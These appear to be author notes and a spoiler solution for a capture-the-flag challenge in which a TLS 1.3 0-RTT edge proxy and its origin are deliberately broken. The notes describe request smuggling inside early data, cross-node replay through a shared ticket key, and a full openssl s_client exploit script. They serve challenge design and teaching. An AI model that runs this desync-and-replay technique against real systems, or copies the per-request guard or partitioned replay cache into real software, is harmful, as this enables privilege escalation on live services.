# Piggyback — author notes & solution

> ⚠️ **Spoilers.** This is the challenge design laid bare. Don't hand it to
> players. It also documents the fact that this service is *deliberately* broken
> in two specific, load-bearing ways — nothing here is an accident.

## TL;DR

A privilege-escalation that only exists in the seam between a 0-RTT edge proxy
and its origin. One bug on each side, and neither is enough alone:

1. **Edge** tags only the *first* request in a 0-RTT early-data buffer with
   `Early-Data: 1`, then forwards the rest of the raw bytes untouched. Pipeline a
   second request into early data and it reaches the origin with no tag — a
   classic request desync, moved onto the TLS fast path.
2. **Origin** is supposed to refuse the privileged `/promote` on anything that
   arrived as early data (0-RTT is replayable; state changes don't belong there).
   Its guard checks the *per-request* `Early-Data` header instead of the
   *connection's* early-data status, so the untagged smuggled request walks past
   it.

`/promote` has to run twice to hand out admin. Each edge keeps its **own**
replay cache, so you can't just fire the same 0-RTT flight at one node twice —
but both nodes share a ticket key, so the identical flight replays cleanly on the
sibling. Round-robin does the distribution for you. Two accepts, two steps, admin.

## What a player sees first (recon)

- `GET /flag` → `403`. Nothing free.
- `GET /promote` on a normal TLS 1.3 connection → `403 Forbidden (not internal)`.
  So it's not a plain authz miss — the endpoint simply isn't reachable from a
  1-RTT connection.
- `GET /promote` as the first request in a **0-RTT** flight → `425 Too Early`.
  Now it's interesting: the endpoint *does* live on the early-data path, and it's
  guarded there. The guard is the thing to beat, and it's beatable only from
  inside early data.

That contradiction — "only reachable via early data, but rejected in early data"
— is the whole puzzle. The resolution is that the guard is per-request, not
per-connection.

## The desync

The edge tags the first early-data request and splices the remainder of the
buffer verbatim. So pipeline two requests into a single early-data flight:

```
GET /warm HTTP/1.1
Host: lab

GET /promote HTTP/1.1
Host: lab
X-Token: <your token>

```

`/warm` is request #1 — it gets the `Early-Data: 1` tag and is otherwise
harmless. `/promote` is request #2 — forwarded raw, untagged. The origin reads
both off the same keep-alive connection; the smuggled one sails past the 425
guard and executes.

## The replay

`/promote` is a two-step ratchet keyed by your token: first accepted call →
step 1, second → step 2 → admin. You need the flight accepted **twice**.

Fire the same flight at one edge twice and the second comes back
`replay: blocked by instance A` — the node remembers the flight. But the two
nodes share a session-ticket key, so the ticket you captured on node A resumes
0-RTT on node B just fine, and node B's replay cache has never seen your flight.
The load balancer round-robins at the connection level, so simply sending the
flight again lands it on the other node. Step 1 on one edge, step 2 on the other.

## Full exploit

```bash
TOK="solver-$RANDOM"
printf 'GET /warm HTTP/1.1\r\nHost: lab\r\n\r\nGET /promote HTTP/1.1\r\nHost: lab\r\nX-Token: %s\r\n\r\n' \
  "$TOK" "$TOK" > flight.bin

# 0) full handshake -> capture a ticket that advertises early_data
{ printf 'GET / HTTP/1.1\r\nHost: lab\r\n\r\n'; sleep 1; } \
  | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3 -sess_out sess.pem

# 1) replay the flight (edge A) -> step 1
sleep 1 | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin
# 2) replay the SAME flight (round-robin -> edge B, cold cache) -> step 2, admin
sleep 1 | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3 -sess_in sess.pem -early_data flight.bin

# 3) collect, same token
{ printf 'GET /flag HTTP/1.1\r\nHost: lab\r\nX-Token: %s\r\n\r\n' "$TOK"; sleep 1; } \
  | openssl s_client -connect CHALLENGE_HOST:443 -servername lab -tls1_3
```

`solve/solve.py` is this, wrapped in a retry loop (round-robin isn't something
the client controls, so it just keeps sending the flight until step 2 lands). It
shells out to `openssl s_client -early_data` because Python's stdlib `ssl` has no
0-RTT API.

**The tooling trap worth knowing:** don't reach for `openssl s_client -quiet`.
It implies `-ign_eof`, the client never closes on stdin EOF, and you deadlock
waiting for a response that the server is holding until you hang up. Keep stdin
open a beat instead (the `sleep`s above). Plenty of solvers lose twenty minutes
here; it's a fair part of "hard."

## No cheese path

The two intended bugs are both necessary, and the obvious shortcuts are closed:

| attempt | result |
| --- | --- |
| edge tags every early-data request | smuggled `/promote` carries the tag → **425** |
| origin guards per-connection, not per-request | smuggled `/promote` is on an early-data connection → **425** |
| `/promote` over a plain 1-RTT connection | **403** — it's early-data-path only |
| forge `Early-Data: 1` yourself on a normal connection | edge strips all client `Early-Data` on the normal path; origin never sees it |
| replay one flight at one node twice | second is `replay: blocked`; you genuinely need two nodes |
| brute/guess `/flag` | **403** until your token actually reached step 2 |

Minimal surface on purpose: no spare endpoints, no injection, no auth bypass. The
only road to the flag is desync + cross-instance 0-RTT replay.

## Difficulty knobs

- **Replay-cache TTL.** It never expires here. Add a short per-node TTL and you
  force the solver to really understand they're buying a fixed number of accepts
  per flight; drop it and they can be sloppier. This is the cleanest "harder"
  dial.
- **Shared vs. partitioned cache — the core decision.** Move the replay cache to
  a shared store (Redis) and the challenge becomes correct and unsolvable; leave
  it per-process and it opens up. This single choice *is* the second vuln.
- **Instance count.** Two is the floor. More nodes plus a tight per-node TTL
  turns "hit the other one" into "plan your accepts across the fleet."
- **Breadcrumbs in the flavor.** "Two edges, one origin, zero wait" on the card
  is a deliberate, fair hint at the topology. Pull it if you want the recon to
  bite harder.
- **PSK-binder red herring (optional).** Expose a `/healthz` that echoes a
  tamperable-looking "binder" value, or hand out a second ticket whose
  `max_early_data` looks editable. It leads nowhere — OpenSSL validates binders —
  but it reliably burns the solvers who fixate on the crypto instead of the HTTP
  desync. Leave it out for a cleaner, more honest challenge; add it if you want a
  nastier one.

## Design-verification map

Every intentional weakness is commented in-source with a `VULN` banner:

- **Desync (edge):** `src/front/front.c` → `tag_first_request()` — tags request #1
  only, splices the rest of the early-data buffer raw.
- **Replay-cache partition (edge):** `src/front/front.c` → `replay_seen_or_record()`
  and the `replay_node` list — per-process cache that should have been shared.
- **Per-request 425 guard (origin):** `src/backend/main.go` → the `/promote` case —
  reads the per-request `Early-Data` header instead of the connection taint.
- **Anti-cheese controls to keep intact:** connection-level `/promote` authz
  (`403` otherwise) in `src/backend/main.go`; `strip_early_data()` on the normal path
  in `src/front/front.c`; the shared STEK via `ticket_key_cb` (same `ticket.key`
  mounted into both edges).
